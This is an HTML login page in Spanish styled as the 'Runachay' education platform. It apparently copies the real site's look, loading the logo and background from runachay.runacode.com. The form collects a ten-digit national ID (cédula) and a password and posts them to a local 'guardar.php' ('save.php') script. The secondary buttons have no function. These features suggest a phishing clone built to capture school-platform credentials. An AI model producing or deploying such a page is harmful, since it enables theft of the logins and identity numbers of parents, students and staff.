<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Runachay - Acceso</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        *{ margin:0; padding:0; box-sizing:border-box; }
        body{ font-family:'Nunito', sans-serif; }
        .background{
            background-image:url('https://runachay.runacode.com/public/img/fondo.jpg');
            background-size:cover; background-position:center; min-height:100vh;
            display:flex; justify-content:center; align-items:center; position:relative;
        }
        .background::before{
            content:""; position:absolute; inset:0;
            background:rgba(32,48,130,0.65); backdrop-filter:blur(3px);
        }
        .card{
            width:1020px; max-width:94%; background:#f3f3f3; border-radius:24px;
            display:flex; position:relative; z-index:2; overflow:hidden;
            box-shadow:0 25px 60px rgba(0,0,0,0.25);
        }
        .card::after{
            content:""; position:absolute; bottom:0; left:0; width:340px; height:95px;
            background:linear-gradient(90deg,#1d63c1,#2bb3d6); border-top-right-radius:70px;
        }
        .left{ width:50%; padding:75px 65px; text-align:center; display:flex; flex-direction:column; justify-content:center; }
        .left img{ width:185px; margin:auto; }
        .left h4{ margin-top:40px; font-size:17px; font-weight:600; color:#1d3db5; line-height:1.6; }
        .left p{ margin-top:28px; font-size:14px; color:#666; }
        .left small{ margin-top:18px; display:block; font-size:12px; color:#888; letter-spacing:1px; }
        .divider{ width:1px; background:#dddddd; margin:60px 0; }
        .right{ width:50%; padding:75px 65px; }
        .right h2{ font-size:30px; font-weight:700; color:#2f3e55; }
        .right span{ display:block; margin-top:8px; margin-bottom:40px; color:#777; font-size:14px; }
        input{
            width:100%; padding:15px; border:1px solid #cfd8dc; border-radius:8px;
            font-size:14px; margin-bottom:20px; transition:0.2s ease;
        }
        input:focus{ outline:none; border:1px solid #1d63c1; box-shadow:0 0 0 3px rgba(29,99,193,0.15); }
        .note{ font-size:12px; color:#888; margin-top:-14px; margin-bottom:22px; }
        button{
            width:100%; padding:15px; border-radius:8px; font-size:14px;
            font-weight:600; cursor:pointer; transition:0.25s ease; border: none;
        }
        .btn-primary{ background:linear-gradient(90deg,#1d63c1,#2bb3d6); color:white; }
        .btn-primary:hover{ opacity:0.92; }
        .btn-outline{ background:white; border:1px solid #1d63c1; color:#1d63c1; margin-top:35px; }
        .btn-light{ background:#dbe8f1; color:#1d63c1; margin-top:15px; }
        @media(max-width:900px){ .card{ flex-direction:column; } .divider{ display:none; } .left,.right{ width:100%; } }
    </style>
</head>
<body>
<div class="background">
    <div class="card">
        <div class="left">
            <img src="https://runachay.runacode.com/public/img/logof.png" alt="Logo">
            <h4>La plataforma de gestión educativa y administrativa más completa y versátil de Latinoamérica.</h4>
            <p>Innovamos para transformar la educación.</p>
            <small>www.runachay.com</small>
        </div>
        <div class="divider"></div>
        <div class="right">
            <h2>Bienvenido a Runachay.</h2>
            <span>Acceso a la plataforma.</span>

            <form action="guardar.php" method="POST">
                <input 
                    type="tel" 
                    name="cedula" 
                    placeholder="Cédula" 
                    required 
                    maxlength="10" 
                    minlength="10" 
                    pattern="[0-9]{10}" 
                    title="Ingrese los 10 dígitos de su cédula" 
                    oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                
                <div class="note">* Recuerde ingresar su número de cédula sin guión</div>
                
                <input type="password" name="password" placeholder="Contraseña" required>
                
                <button type="submit" class="btn-primary">ACCEDER</button>
            </form>

            <button class="btn-outline">Centro de soporte</button>
            <button class="btn-light">Instructivos para padres</button>
        </div>
    </div>
</div>
</body>
</html>
